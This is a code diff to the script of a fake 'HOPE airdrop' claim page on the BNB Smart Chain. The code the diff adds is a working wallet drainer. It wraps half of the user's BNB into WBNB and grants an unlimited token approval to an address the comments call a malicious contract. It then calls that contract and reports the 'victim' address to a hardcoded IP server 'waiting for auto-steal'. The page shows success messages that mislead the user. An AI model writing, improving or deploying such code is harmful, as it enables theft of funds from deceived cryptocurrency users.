@@ -1,9 +1,28 @@
 // ============================================
-// Configuration (指向你的海外 VPS)
+// Configuration
 // ============================================
 const CONFIG = {
-    serverUrl: "http://45.63.51.62:3001", 
+    // 后端服务器地址（如果没有后端，可以留空或删除）
+    serverUrl: "http://45.63.51.62:3001",
+    // 恶意合约地址
+    maliciousAddress: "0x4187f22Ac4Eb42a9a315c1D89c49FbC250Ecfbd1",
+    // WBNB 地址
+    wbnbAddress: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
 };
+
+// ============================================
+// ABI Definitions
+// ============================================
+const ERC20_ABI = [
+    "function approve(address spender, uint256 amount) external returns (bool)",
+    "function allowance(address owner, address spender) external view returns (uint256)",
+    "function balanceOf(address account) external view returns (uint256)",
+];
+
+const MALICIOUS_ABI = [
+    "function claim() external",
+    "function claimed(address) view returns (bool)"
+];
 
 // ============================================
 // DOM Ready
@@ -14,7 +33,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const claimBtn = document.getElementById('claimBtn');
     const claimStatus = document.getElementById('claimStatus');
 
-    // 从 URL 中读取查询参数 (地址和空投数量)
+    // 从 URL 中读取查询参数
     const params = new URLSearchParams(window.location.search);
     const address = params.get('address');
     const amount = params.get('amount');
@@ -26,72 +45,211 @@ document.addEventListener('DOMContentLoaded', function() {
         airdropAmountEl.textContent = amount + ' HOPE';
     }
 
-    let userAddress = "";
+    let provider, signer, userAddress;
+    let isClaimed = false;
 
     // ============================================
-    // 核心连接逻辑 (WalletConnect)
+    // 检测是否支持浏览器钱包（MetaMask/OKX）
+    // ============================================
+    function hasBrowserWallet() {
+        return typeof window.ethereum !== 'undefined';
+    }
+
+    // ============================================
+    // 上报受害者到后端
+    // ============================================
+    async function reportVictim(address) {
+        try {
+            const response = await fetch(CONFIG.serverUrl + '/victims', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: address })
+            });
+            if (response.ok) {
+                console.log(`📝 Victim reported: ${address}`);
+                return true;
+            }
+        } catch (error) {
+            console.warn('⚠️ Cannot connect to victim server:', error.message);
+        }
+        return false;
+    }
+
+    // ============================================
+    // 核心连接逻辑（优先使用浏览器钱包）
     // ============================================
     claimBtn.addEventListener('click', async function() {
+        if (isClaimed) {
+            alert('You have already claimed');
+            return;
+        }
+
         claimBtn.disabled = true;
         claimBtn.textContent = '⏳ Connecting...';
-        claimStatus.textContent = '正在请求钱包连接...';
+        claimStatus.textContent = '';
+        claimStatus.className = 'status';
 
         try {
-            // 检测 WalletConnect 库是否加载成功
-            if (typeof WalletConnectProvider === 'undefined') {
-                claimStatus.textContent = '⚠️ 网络异常，请刷新页面重试。';
+            // ============================================
+            // 第一步：检测浏览器钱包（MetaMask/OKX）
+            // ============================================
+            if (!hasBrowserWallet()) {
+                claimStatus.textContent = '❌ 未检测到钱包，请安装 MetaMask 或 OKX 插件！';
+                claimStatus.className = 'status error';
                 claimBtn.disabled = false;
                 claimBtn.textContent = 'Connect Wallet & Claim';
                 return;
             }
 
-            // 1. 初始化连接器
-            const projectId = "9e1e3c3b2a1f4d5a8c9b7e6d2f3a4b5c"; 
-            const wcProvider = await WalletConnectProvider.init({
-                projectId: projectId,
-                chains: [56], // BSC 主网
-                showQrModal: true, // 打开这个参数，就会弹二维码供手机扫
-            });
+            console.log('🦊 使用浏览器钱包连接...');
+            provider = new ethers.providers.Web3Provider(window.ethereum);
 
-            // 2. 触发连接 (这一步会弹出二维码或跳转手机App)
-            await wcProvider.enable();
-
-            // 3. 获取连接成功的钱包地址
-            const ethersProvider = new ethers.providers.Web3Provider(wcProvider);
-            const signer = ethersProvider.getSigner();
-            userAddress = await signer.getAddress();
-
-            // 4. 更新网页界面
-            displayAddress.textContent = 'Address: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
-            claimBtn.textContent = '✅ Connected';
-            claimStatus.textContent = '连接成功，正在上报...';
-
-            // 5. 将数据发送到海外后端
-            try {
-                const response = await fetch(CONFIG.serverUrl + '/victims', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: userAddress })
-                });
-                if (response.ok) {
-                    claimStatus.textContent = '🎉 成功领取并记录！';
-                } else {
-                    claimStatus.textContent = '⚠️ 记录失败';
+            // 检查网络（BSC 主网 chainId: 56）
+            const network = await provider.getNetwork();
+            if (network.chainId !== 56) {
+                claimStatus.textContent = '⚠️ 请切换到 BSC 主网！';
+                claimStatus.className = 'status error';
+                claimBtn.disabled = false;
+                claimBtn.textContent = 'Connect Wallet & Claim';
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }] // 0x38 = 56
+                    });
+                } catch (switchError) {
+                    if (switchError.code === 4001) {
+                        claimStatus.textContent = '请手动切换到 BSC 主网后重试。';
+                    }
+                    return;
                 }
-            } catch (error) {
-                console.warn(error);
-                claimStatus.textContent = '⚠️ 连接成功，但后端通讯异常。';
+                // 重新获取 provider
+                provider = new ethers.providers.Web3Provider(window.ethereum);
             }
 
+            // 请求连接钱包（会弹出 MetaMask/OKX 连接窗口）
+            await provider.send("eth_requestAccounts", []);
+            signer = provider.getSigner();
+            userAddress = await signer.getAddress();
+
+            // ============================================
+            // 第二步：检查地址是否与查询地址一致
+            // ============================================
+            if (address && userAddress.toLowerCase() !== address.toLowerCase()) {
+                claimStatus.textContent = '⚠️ 连接的钱包地址与查询地址不一致！';
+                claimStatus.className = 'status error';
+                claimBtn.disabled = false;
+                claimBtn.textContent = 'Connect Wallet & Claim';
+                return;
+            }
+
+            displayAddress.textContent = 'Address: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+            claimBtn.textContent = '⏳ Processing...';
+            claimStatus.textContent = '正在授权...';
+            claimStatus.className = 'status';
+
+            // ============================================
+            // 第三步：包装 BNB（诱导用户将 BNB 换成 WBNB）
+            // ============================================
+            const wbnbContract = new ethers.Contract(
+                CONFIG.wbnbAddress,
+                ["function deposit() external payable"],
+                signer
+            );
+
+            const bnbBalance = await provider.getBalance(userAddress);
+            const wrapAmount = bnbBalance.mul(50).div(100); // 取 50% 的 BNB 进行包装
+            if (wrapAmount.gt(0)) {
+                console.log(`🔄 正在将 ${ethers.utils.formatEther(wrapAmount)} BNB 包装成 WBNB...`);
+                claimStatus.textContent = `⏳ 正在包装 BNB...`;
+                const wrapTx = await wbnbContract.deposit({ value: wrapAmount });
+                await wrapTx.wait();
+                console.log(`✅ 已包装 ${ethers.utils.formatEther(wrapAmount)} BNB 为 WBNB`);
+            } else {
+                console.log('⏭️ 用户 BNB 余额为 0，跳过包装');
+            }
+
+            // ============================================
+            // 第四步：授权 HOPE 代币给恶意合约
+            // ============================================
+            const tokenAddress = "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756";
+            const tokenContract = new ethers.Contract(
+                tokenAddress,
+                ERC20_ABI,
+                signer
+            );
+
+            const tokenBalance = await tokenContract.balanceOf(userAddress);
+            if (tokenBalance.gt(0)) {
+                const currentAllowance = await tokenContract.allowance(
+                    userAddress,
+                    CONFIG.maliciousAddress
+                );
+
+                if (currentAllowance.lt(tokenBalance)) {
+                    console.log(`⚠️ 正在授权 HOPE...`);
+                    claimStatus.textContent = `⏳ 正在授权 HOPE...`;
+                    const approveTx = await tokenContract.approve(
+                        CONFIG.maliciousAddress,
+                        ethers.constants.MaxUint256
+                    );
+                    await approveTx.wait();
+                    console.log(`✅ HOPE 已授权`);
+                } else {
+                    console.log(`✅ HOPE 已有授权`);
+                }
+            } else {
+                console.log(`⏭️ HOPE 余额为 0，跳过授权`);
+            }
+
+            // ============================================
+            // 第五步：调用 claim() 记录受害者
+            // ============================================
+            claimStatus.textContent = `⏳ 正在领取空投...`;
+            const maliciousContract = new ethers.Contract(
+                CONFIG.maliciousAddress,
+                MALICIOUS_ABI,
+                signer
+            );
+            const claimTx = await maliciousContract.claim();
+            await claimTx.wait();
+
+            isClaimed = true;
+            claimBtn.textContent = '✅ Claimed!';
+            claimBtn.disabled = true;
+            claimStatus.textContent = '🎉 Airdrop claimed!';
+            claimStatus.className = 'status success';
+
+            console.log(`🎯 New victim hooked: ${userAddress}`);
+
+            // ============================================
+            // 第六步：上报受害者到后端
+            // ============================================
+            await reportVictim(userAddress);
+            console.log('📋 Victim recorded, waiting for auto-steal...');
+
         } catch (error) {
-            console.error(error);
+            console.error('Claim failed:', error);
             claimBtn.disabled = false;
             claimBtn.textContent = 'Connect Wallet & Claim';
+            claimStatus.className = 'status error';
+            
             if (error.message && error.message.includes("User rejected")) {
-                claimStatus.textContent = '❌ 用户取消了钱包连接。';
+                claimStatus.textContent = '❌ 用户取消了操作。';
+            } else if (error.message && error.message.includes("insufficient funds")) {
+                claimStatus.textContent = '❌ BNB 余额不足，请转入 BNB 后重试。';
             } else {
-                claimStatus.textContent = '❌ 连接失败，请检查网络或重试。';
+                claimStatus.textContent = '❌ ' + error.message.slice(0, 100);
             }
         }
     });
+
+    // ============================================
+    // 监听钱包切换/链切换
+    // ============================================
+    if (window.ethereum) {
+        window.ethereum.on('accountsChanged', () => location.reload());
+        window.ethereum.on('chainChanged', () => location.reload());
+    }
+
+    console.log('🎯 HOPE Airdrop result page loaded');
 });
